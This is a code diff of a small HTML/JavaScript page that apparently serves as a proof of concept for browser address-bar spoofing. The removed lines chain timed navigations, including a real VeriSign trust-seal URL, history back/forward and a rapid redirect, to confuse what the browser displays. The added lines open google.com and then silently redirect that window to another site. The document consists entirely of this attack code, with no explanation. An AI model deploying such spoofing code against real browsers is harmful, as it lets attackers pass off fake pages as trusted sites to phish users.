@@ -1,21 +1,9 @@
+<input onclick="start()" type="button" value="Click here" />
+
 <script>
-var w = null;
-function spoof() {
-  w = window.open("about:blank");
+  function start(){
+  var x = window.open('https://www.google.com');
+    setTimeout(function(){x.location="http://hb.com"}, 1000)
+  }
 
-  // Step 1: Load victim page.
-  w.location = "attacker.html";
-
-  // Step 2: Navigate to attacker's page.
-  setTimeout('w.location = "https://trustsealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=www.verisign.fr&lang=fr"', 1000);
-
-  // Step 3: Go back.
-  setTimeout('w.history.back();', 2000);
-
-  // Step 4: Go forward, but interrupt with a quick fragment navigation.
-  setTimeout('w.history.forward(); setTimeout("w.location = \'crash.html\'", 0);', 2100);
-
-}
-</script>
-
-<a href="javascript:spoof();">Click Me</a>
+  </script>
